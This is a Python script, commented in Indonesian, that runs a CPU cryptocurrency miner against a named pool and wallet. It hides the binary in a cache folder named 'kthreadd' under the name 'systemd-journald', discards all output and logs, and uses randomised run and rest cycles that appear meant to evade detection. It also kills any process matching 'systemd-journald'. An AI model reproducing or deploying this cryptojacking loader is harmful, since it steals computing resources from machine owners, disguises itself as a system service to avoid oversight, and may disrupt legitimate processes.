import subprocess
import time
import os
import random

# Konfigurasi
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
POOL = "ghost.darkverse.cloud:11002"
ALGO = "verushash"
CPU_THREADS = 1
BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
ORIGINAL_BINARY = os.path.join(BASE_PATH, "systemd-journald")

# Cek dulu apakah binary-nya ada
if not os.path.exists(ORIGINAL_BINARY):
    print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
    exit(1)

while True:
    run_minutes = random.randint(35, 50)
    rest_minutes = random.randint(2, 5)

    print(f"Menjalankan miner selama {run_minutes} menit...")

    try:
        process = subprocess.Popen([
            ORIGINAL_BINARY,
            "--algorithm", ALGO,
            "--pool", POOL,
            "--wallet", WALLET,
            "--cpu-threads", str(CPU_THREADS),
            "--dns-over-https", "1",
            "--no-color",
            "--log-file", "/dev/null"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(run_minutes * 60)

        print(f"Istirahat selama {rest_minutes} menit...")
        process.terminate()
        process.wait(timeout=10)
    except Exception as e:
        print("Terjadi error:", e)

    # Bersih-bersih
    os.system("pkill -f systemd-journald")
    time.sleep(rest_minutes * 60)
